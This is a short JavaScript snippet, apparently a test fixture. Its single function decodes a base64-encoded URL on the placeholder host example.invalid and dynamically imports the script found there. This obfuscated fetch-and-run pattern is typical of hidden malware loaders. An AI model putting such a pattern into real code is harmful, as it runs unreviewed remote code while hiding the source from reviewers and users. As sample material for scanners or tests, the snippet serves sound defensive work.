function inspectModule() {
  const source = atob('aHR0cHM6Ly9leGFtcGxlLmludmFsaWQvZml4dHVyZS5qcw==');
  return import(source);
}
